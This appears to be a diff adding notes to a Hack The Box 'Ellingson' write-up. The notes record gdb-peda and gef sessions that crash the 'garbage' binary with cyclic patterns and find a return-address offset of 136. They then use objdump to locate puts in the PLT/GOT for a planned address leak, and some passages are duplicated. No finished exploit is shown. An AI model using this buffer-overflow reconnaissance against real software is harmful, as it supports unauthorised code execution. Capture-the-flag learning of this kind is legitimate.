@@ -157,6 +157,162 @@ gdb-peda$
 
 ----------------------------------
 
+gdb-peda$ x/xg $rsp
+0x7ffca452d4a8: 0x41416d4141514141
+gdb-peda$ pattern_offset 0x41416d4141514141
+4702159612987654465 found at offset: 136
+gdb-peda$ 
+-------------------------
+
+Seeing that the overflow starts after 136. Next, I need to get the addresses of PLT(Procedural Linkage Table),GOT(Global Offset Table), and make the binary leak an address:
+
+-------------------------------
+gdb-peda$ pattern_create 300
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'
+gdb-peda$ r 
+Starting program: /root/Desktop/pwn/office/HTB/Ellingson/garbage 
+Enter access password: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%
+
+access denied.
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x0 
+RCX: 0x7fc36fefa643 (<__GI___libc_write+19>:    cmp    rax,0xfffffffffffff000)
+RDX: 0x0 
+RSI: 0x8d49c0 ("access denied.\nssword: ")
+RDI: 0x7fc36ffcb4c0 --> 0x0 
+RBP: 0x6c41415041416b41 ('AkAAPAAl')
+RSP: 0x7ffd5d154148 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
+RIP: 0x401618 (<auth+261>:      ret)
+R8 : 0xf 
+R9 : 0x7ffd5d1540c0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
+R10: 0x7fc370004e00 (<strcmp+4144>:     pxor   xmm0,xmm0)
+R11: 0x246 
+R12: 0x401170 (<_start>:        xor    ebp,ebp)
+R13: 0x7ffd5d154240 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x40160d <auth+250>: call   0x401050 <puts@plt>
+   0x401612 <auth+255>: mov    eax,0x0
+   0x401617 <auth+260>: leave  
+=> 0x401618 <auth+261>: ret    
+   0x401619 <main>:     push   rbp
+   0x40161a <main+1>:   mov    rbp,rsp
+   0x40161d <main+4>:   sub    rsp,0x10
+   0x401621 <main+8>:   mov    eax,0x0
+[------------------------------------stack-------------------------------------]
+0000| 0x7ffd5d154148 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
+0008| 0x7ffd5d154150 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
+0016| 0x7ffd5d154158 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
+0024| 0x7ffd5d154160 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
+0032| 0x7ffd5d154168 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
+0040| 0x7ffd5d154170 ("AuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
+0048| 0x7ffd5d154178 ("AAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
+0056| 0x7ffd5d154180 ("ZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x0000000000401618 in auth ()
+gdb-peda$ x/xg $rsp
+0x7ffd5d154148: 0x41416d4141514141
+gdb-peda$ pattern_offset 0x41416d4141514141
+4702159612987654465 found at offset: 136
+
+---------------------------------------------------------
+Seeing that the overflow starts after 136. Next, I need to get the addresses of PLT(Procedural Linkage Table),GOT(Global Offset Table), and make the binary leak an address:
+
+➜  Ellingson objdump -D garbage| grep puts
+0000000000401050 <puts@plt>:
+  401050:       ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>
+  401321:       e8 2a fd ff ff          callq  401050 <puts@plt>
+  401334:       e8 17 fd ff ff          callq  401050 <puts@plt>
+  4014c3:       e8 88 fb ff ff          callq  401050 <puts@plt>
+  4015fa:       e8 51 fa ff ff          callq  401050 <puts@plt>
+  40160d:       e8 3e fa ff ff          callq  401050 <puts@plt>
+  401651:       e8 fa f9 ff ff          callq  401050 <puts@plt>
+  40165d:       e8 ee f9 ff ff          callq  401050 <puts@plt>
+  401669:       e8 e2 f9 ff ff          callq  401050 <puts@plt>
+  401675:       e8 d6 f9 ff ff          callq  401050 <puts@plt>
+  401681:       e8 ca f9 ff ff          callq  401050 <puts@plt>
+  40168d:       e8 be f9 ff ff          callq  401050 <puts@plt>
+  401699:       e8 b2 f9 ff ff          callq  401050 <puts@plt>
+  40171c:       e8 2f f9 ff ff          callq  401050 <puts@plt>
+➜  Ellingson 
+
+--------------------------------------------------------
+gef
+
+gef➤  pattern create 300
+[+] Generating a pattern of 300 bytes
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
+[+] Saved as '$_gef0'
+gef➤  r
+Starting program: /root/Desktop/pwn/office/HTB/Ellingson/garbage 
+Enter access password: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
+
+access denied.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000401618 in auth ()
+[ Legend: Modified register | Code | Heap | Stack | String ]
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0               
+$rbx   : 0x0               
+$rcx   : 0x00007ff2d120b643  →  0x5577fffff0003d48 ("H="?)
+$rdx   : 0x0               
+$rsp   : 0x00007ffdcaa63708  →  "raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"
+$rbp   : 0x6161616161616171 ("qaaaaaaa"?)
+$rsi   : 0x00000000012f29c0  →  "access denied.\nssword: "
+$rdi   : 0x00007ff2d12dc4c0  →  0x0000000000000000
+$rip   : 0x0000000000401618  →  <auth+261> ret 
+$r8    : 0xf               
+$r9    : 0x00007ffdcaa63680  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
+$r10   : 0x00007ff2d1315e00  →  <strcmp+4144> pxor xmm0, xmm0
+$r11   : 0x246             
+$r12   : 0x0000000000401170  →  <_start+0> xor ebp, ebp
+$r13   : 0x00007ffdcaa63800  →  0x0000000000000001
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007ffdcaa63708│+0x0000: "raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"    ← $rsp
+0x00007ffdcaa63710│+0x0008: "saaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaaya[...]"
+0x00007ffdcaa63718│+0x0010: "taaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaaza[...]"
+0x00007ffdcaa63720│+0x0018: "uaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabba[...]"
+0x00007ffdcaa63728│+0x0020: "vaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabca[...]"
+0x00007ffdcaa63730│+0x0028: "waaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabda[...]"
+0x00007ffdcaa63738│+0x0030: "xaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabea[...]"
+0x00007ffdcaa63740│+0x0038: "yaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfa[...]"
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x40160d <auth+250>       call   0x401050 <puts@plt>
+     0x401612 <auth+255>       mov    eax, 0x0
+     0x401617 <auth+260>       leave  
+ →   0x401618 <auth+261>       ret    
+[!] Cannot disassemble from $PC
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "garbage", stopped 0x401618 in auth (), reason: SIGSEGV
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x401618 → auth()
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  
+
+-------------------------------------------------------------
+offset
+
+gef➤  x/xg $rsp
+0x7ffdcaa63708: 0x6161616161616172
+gef➤  pattern offset 0x6161616161616172
+[+] Searching '0x6161616161616172'
+[+] Found at offset 136 (little-endian search) likely
+[+] Found at offset 129 (big-endian search) 
+gef➤  
+
+
 
 
 
